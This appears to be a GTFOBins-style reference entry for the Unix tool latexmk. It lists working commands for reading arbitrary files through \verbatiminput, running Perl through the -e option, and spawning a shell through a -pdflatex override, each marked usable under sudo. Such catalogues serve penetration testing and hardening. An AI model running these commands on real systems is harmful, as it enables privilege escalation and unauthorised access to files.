---
type: gtfobin
name: latexmk
platform: Unix
functions: [file-read, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# latexmk

## file-read

```bash
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi
```
_The read file will be part of the output._
**Contexts:** sudo, unprivileged

## inherit

```bash
latexmk -e '...'
```
_This allows to run Perl code (`...`)._
**Contexts:** sudo, unprivileged

## shell

```bash
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```
**Contexts:** sudo, unprivileged
